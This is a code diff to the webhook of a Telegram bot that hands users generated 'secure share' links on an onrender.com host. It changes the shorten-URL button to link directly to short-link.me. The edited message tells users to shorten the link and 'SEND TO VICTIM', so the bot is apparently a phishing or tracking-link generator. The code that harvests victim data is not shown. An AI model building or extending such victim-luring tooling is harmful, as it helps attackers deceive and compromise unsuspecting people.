@@ -400,13 +400,6 @@ def webhook():
                         "text": "Join channel first!",
                         "show_alert": True
                     })
-            elif data_str == "shorten_url":
-                requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={
-                    "callback_query_id": cb_id,
-                    "text": "🔗 Opening short-link.me...",
-                    "show_alert": False,
-                    "url": "https://short-link.me"
-                })
             return jsonify({"status": "ok"}), 200
 
         if 'message' not in data:
@@ -485,7 +478,7 @@ def webhook():
 
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{short_code}"
 
-                # Message with copy code format + buttons
+                # Message with corrected text and WEB BUTTON for shorten URL
                 message_text = f"""<b>🔐 YOUR SECURE SHARE LINK IS READY!</b>
 
 ━━━━━━━━━━━━━━━━━━━━━━
@@ -496,7 +489,7 @@ def webhook():
 
 ━━━━━━━━━━━━━━━━━━━━━━
 
-<b>📋 2. COPY LINK & SHORTEN URL:</b>
+<b>📋 2. COPY LINK & SHORTEN URL & SEND TO VICTIM:</b>
 
 <code>{link}</code>
 
@@ -504,11 +497,12 @@ def webhook():
 
 <b>👇 CHOOSE AN OPTION BELOW:</b>"""
 
+                # Both buttons as WEB BUTTONS (url type)
                 markup = {
                     "inline_keyboard": [
                         [
                             {"text": "🔗 OPEN LINK 🔗", "url": link},
-                            {"text": "🔗 SHORTEN URL 🔗", "callback_data": "shorten_url"}
+                            {"text": "🔗 SHORTEN URL 🔗", "url": "https://short-link.me"}
                         ]
                     ]
                 }
